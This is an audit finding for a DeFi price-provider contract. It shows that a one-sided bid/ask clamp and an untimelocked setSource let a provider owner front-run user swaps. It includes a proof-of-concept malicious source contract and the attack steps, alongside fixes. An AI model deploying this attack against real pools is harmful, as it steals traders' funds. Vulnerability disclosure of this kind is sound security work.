### Title
`AnchoredPriceProvider` Source Clamp Is One-Directional — Provider Owner Can Instantly Swap In a Malicious Source That Delivers an Unbounded Spread to Pool Swaps - (File: `smart-contracts-poc/contracts/AnchoredPriceProvider.sol`)

---

### Summary

The `_computeBidAsk` clamp in `AnchoredPriceProvider` uses `Math.min(refBid, cBid)` / `Math.max(refAsk, cAsk)`, which only prevents the source from **tightening** the spread below the reference band. It places **no upper bound** on how wide the source can push the spread. A malicious source returning `(1, type(uint128).max - 1)` passes every validation gate in `_readSource` and `getBidAndAskPrice`, and the pool receives an extreme bid/ask that causes traders to lose nearly all their input tokens. Because `setSource` carries **no timelock**, the provider owner can front-run any swap in a single block.

---

### Finding Description

**The clamp is one-directional.** [1](#0-0) 

```solidity
// _computeBidAsk — step 8
uint256 bidOut = Math.min(refBid, cBid);   // source can push bid BELOW refBid
uint256 askOut = Math.max(refAsk, cAsk);   // source can push ask ABOVE refAsk
if (bidOut == 0 || bidOut >= askOut) {
    return (0, type(uint128).max);
}
return (uint128(bidOut), uint128(askOut));
```

The design comment claims "no timelock needed: any source is clamp-bounded at all times." [2](#0-1) 

That claim is only true in one direction. The clamp clips a source that tries to **tighten** the spread (higher bid, lower ask) back to the reference band edge. It does **nothing** to a source that **widens** the spread (lower bid, higher ask). A source returning `(1, type(uint128).max - 1)` clears every guard:

| Check | Value | Result |
|---|---|---|
| `_readSource`: `srcBid == 0` | `srcBid = 1` | pass |
| `_readSource`: `srcBid >= srcAsk` | `1 < type(uint128).max - 1` | pass |
| `_readSource`: `srcAsk > type(uint128).max` | `type(uint128).max - 1` | pass |
| `_computeBidAsk`: `bidOut == 0` | `min(refBid, 1) = 1` | pass |
| `_computeBidAsk`: `bidOut >= askOut` | `1 < type(uint128).max - 1` | pass |
| `getBidAndAskPrice`: `ask == type(uint128).max` | `type(uint128).max - 1` | pass | [3](#0-2) [4](#0-3) 

The pool's `_getBidAndAskPriceX64` accepts the result without further bounds checking: [5](#0-4) 

It then feeds `(1, type(uint128).max - 1)` directly into `SwapMath.midAndSpreadFeeX64FromBidAsk`, producing an extreme mid price and spread fee that causes any swap to execute at a price that extracts nearly all of the trader's input.

**`setSource` has no timelock.** [6](#0-5) 

The only gate is `onlyProviderOwner`. `createAnchoredProvider` is permissionless — any caller becomes `providerOwner`: [7](#0-6) 

This contrasts sharply with the pool-level oracle rotation, which enforces `priceProviderTimelock`: [8](#0-7) 

A pool admin who is also the provider owner can bypass the pool-level timelock entirely by changing the source within the provider — a change that takes effect in the same block with no delay.

**Attack path (single block):**

1. Provider owner (permissionless creator) deploys `MaliciousSource` returning `(1, type(uint128).max - 1)`.
2. Observes a pending user swap in the mempool.
3. Front-runs with `AnchoredProviderFactory.setSource(provider, address(maliciousSource))`.
4. User's swap executes: pool reads `(1, type(uint128).max - 1)`, mid ≈ `type(uint128).max / 2`, spread ≈ 100%. Trader receives near-zero output.
5. Provider owner calls `setSource(provider, normalSource)` to restore normal operation.

---

### Impact Explanation

Direct loss of user principal. A trader swapping in any pool whose `AnchoredPriceProvider` is in source mode receives near-zero output tokens because the pool's swap math uses the unbounded bid/ask from the malicious source. The pool's only guard (`bid >= ask` and `bid == 0`) does not fire for `(1, type(uint128).max - 1)`. The loss is bounded only by the trader's input amount and the pool's liquidity.

---

### Likelihood Explanation

- `createAnchoredProvider` is permissionless; any address can become a provider owner.
- `setSource` requires no timelock, no multisig, and no on-chain delay.
- Front-running is feasible on all target chains (Ethereum, Base, HyperEVM, Arbitrum, Optimism).
- The pool admin who deploys both the pool and the provider controls both levers simultaneously.
- A user who does not set a tight `priceLimitX64` in `swap()` has no on-chain protection.

---

### Recommendation

1. **Make the clamp symmetric.** Change the clamp so the source can only **tighten** the spread (the intended use case), not widen it:
   ```solidity
   uint256 bidOut = Math.max(refBid, cBid);   // source cannot lower bid below refBid
   uint256 askOut = Math.min(refAsk, cAsk);   // source cannot raise ask above refAsk
   ```
   If the source quote is wider than the reference band, fall back to the reference band directly.

2. **Add a timelock to `setSource`.** Mirror the pool-level `priceProviderTimelock` pattern: require a propose-then-execute delay before a new source takes effect, giving users time to observe and react.

3. **Add a maximum spread bound.** Reject source quotes where `cAsk / cBid` exceeds a factory-configured multiple of `refAsk / refBid`, ensuring no source can deliver a spread more than N× the reference band.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IAnchorSource} from "smart-contracts-poc/contracts/interfaces/IAnchorSource.sol";

/// @dev Malicious source: returns near-zero bid and near-max ask.
contract MaliciousSource is IAnchorSource {
    function getBidAndAskPrice() external pure returns (uint128 bid, uint128 ask) {
        return (1, type(uint128).max - 1);
    }
}

// --- Attack sequence (pseudo-test) ---
// 1. Attacker creates provider (permissionless)
address provider = anchoredProviderFactory.createAnchoredProvider(
    oracle, feedId, bytes32(0), minMargin, staleness, maxSpread, false, 0, token0, token1
);
// providerOwner[provider] == attacker

// 2. Pool is created using this provider (pool admin == attacker)
address pool = metricFactory.createPool(params); // params.priceProvider = provider

// 3. Users add liquidity; attacker observes a pending swap

// 4. Front-run: swap in malicious source (no timelock, same block)
MaliciousSource malicious = new MaliciousSource();
anchoredProviderFactory.setSource(provider, address(malicious));

// 5. User's swap executes — pool reads (1, type(uint128).max - 1)
//    SwapMath.midAndSpreadFeeX64FromBidAsk receives extreme values
//    Trader receives near-zero token output

// 6. Attacker restores normal source
anchoredProviderFactory.setSource(provider, address(normalSource));
```

The `_readSource` staticcall returns exactly 64 bytes, `srcBid=1 > 0`, `srcBid < srcAsk`, `srcAsk < type(uint128).max`, so every guard in `_readSource` and `_computeBidAsk` passes. The pool's `_getBidAndAskPriceX64` check (`bid >= ask` → revert, `bid == 0` → revert) also passes. The extreme quote reaches `SwapMath` unmodified.

### Citations

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L22-24)
```text
///         Clamp parameters (minMargin, MAX_REF_STALENESS, MAX_SPREAD_BPS) and the reference binding are immutable;
///         the source pointer is instantly swappable (no timelock needed: any source is clamp-bounded
///         at all times). No proxies — upgrades are new deployments.
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L214-217)
```text
    function getBidAndAskPrice() external override returns (uint128 bid, uint128 ask) {
        (bid, ask) = _getBidAndAskPrice();
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L340-348)
```text
        // 8. Clamp: out-of-band custom quotes are clipped silently to the band edge.
        //    bid ≤ refBid < refAsk ≤ ask, so bid < ask holds by construction.
        uint256 bidOut = Math.min(refBid, cBid);
        uint256 askOut = Math.max(refAsk, cAsk);
        if (bidOut == 0 || bidOut >= askOut) {
            return (0, type(uint128).max);
        }

        return (uint128(bidOut), uint128(askOut));
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L385-411)
```text
    function _readSource(address _source)
        internal view returns (bool ok, uint256 srcBid, uint256 srcAsk)
    {
        bytes4 sel = IAnchorSource.getBidAndAskPrice.selector;
        bool success;
        uint256 retSize;
        uint256 b;
        uint256 a;
        assembly ("memory-safe") {
            // Scratch beyond the free-memory pointer; never updated, so this is memory-safe.
            let ptr := mload(0x40)
            mstore(ptr, sel) // 4-byte selector, left-aligned
            // Input is consumed before output is written, so in/out may share ptr. Output is capped
            // at 0x40 bytes: a larger returndata is NOT copied (only returndatasize() reports it).
            success := staticcall(SOURCE_GAS_LIMIT, _source, ptr, 0x04, ptr, 0x40)
            retSize := returndatasize()
            b := mload(ptr)
            a := mload(add(ptr, 0x20))
        }
        if (!success || retSize != 64) return (false, 0, 0);

        srcBid = b;
        srcAsk = a;
        if (srcBid == 0 || srcBid >= srcAsk || srcAsk > type(uint128).max) return (false, 0, 0);

        return (true, srcBid, srcAsk);
    }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L804-813)
```text
  function _getBidAndAskPriceX64() internal returns (uint128 bidPriceX64, uint128 askPriceX64) {
    address activePriceProvider = _resolvedPriceProvider();
    try IPriceProvider(activePriceProvider).getBidAndAskPrice() returns (uint128 bid, uint128 ask) {
      if (bid >= ask) revert BidGreaterThanAsk();
      if (bid == 0) revert BidIsZero();
      return (bid, ask);
    } catch (bytes memory reason) {
      revert PriceProviderFailed(reason);
    }
  }
```

**File:** smart-contracts-poc/contracts/AnchoredProviderFactory.sol (L196-201)
```text
        provider = address(p);
        address creator = msg.sender;

        _providers.add(provider);
        _providersByCreator[creator].add(provider);
        providerOwner[provider] = creator;
```

**File:** smart-contracts-poc/contracts/AnchoredProviderFactory.sol (L222-228)
```text
    /// @notice Swap a provider's source (zero → reference mode). The curator's only knob — instant,
    ///         no timelock: any source is clamp-bounded by the provider at all times.
    function setSource(address provider, address newSource) external override onlyProviderOwner(provider) {
        require(_providers.contains(provider), ProviderNotTracked());
        AnchoredPriceProvider(provider).setSource(newSource);
        emit SourceSet(provider, newSource);
    }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L487-490)
```text
    uint256 executeAfter = block.timestamp + timelock;
    pendingPriceProvider[pool] = newPriceProvider;
    pendingPriceProviderExecuteAfter[pool] = executeAfter;
    emit PoolPriceProviderChangeProposed(pool, current, newPriceProvider, executeAfter);
```
